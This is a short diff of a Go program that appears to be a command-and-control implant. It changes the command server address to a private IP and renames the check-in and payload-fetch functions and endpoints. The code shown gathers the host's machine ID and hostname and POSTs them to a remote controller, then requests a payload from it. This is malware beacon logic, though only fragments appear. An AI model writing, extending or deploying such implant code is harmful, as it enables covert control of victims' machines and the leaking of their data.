@@ -22,7 +22,8 @@ import (
 
 // Setting the command server
 // var command_server string = "http://192.168.0.69:8081"
-var command_server string = "http://localhost:8081"
+// var command_server string = "http://localhost:8081"
+var command_server string = "http://192.168.0.29:8081"
 
 // Variables assigned later
 var NodeID string = "" // This will be a GUID at some point
@@ -65,7 +66,7 @@ func main() {
 
 	NodeID, _ = machineid.ID()
 
-	checkIn()
+	old_checkIn()
 
 	getFIle()
 
@@ -110,7 +111,7 @@ func main() {
 
 }
 
-func checkIn() {
+func old_checkIn() {
 
 	// Getting the info
 	hostname, _ := os.Hostname()
@@ -123,7 +124,7 @@ func checkIn() {
 		log.Fatal(err)
 	}
 
-	r, err := http.NewRequest("POST", command_server+"/checkin", bytes.NewBuffer(json_data))
+	r, err := http.NewRequest("POST", command_server+"/old-checkin", bytes.NewBuffer(json_data))
 	if err != nil {
 		panic(err)
 	}
@@ -176,7 +177,7 @@ func getFIle() {
 		log.Fatal(err)
 	}
 
-	r, err := http.NewRequest("POST", command_server+"/payload", bytes.NewBuffer(json_data))
+	r, err := http.NewRequest("POST", command_server+"/old-payload", bytes.NewBuffer(json_data))
 	if err != nil {
 		panic(err)
 	}
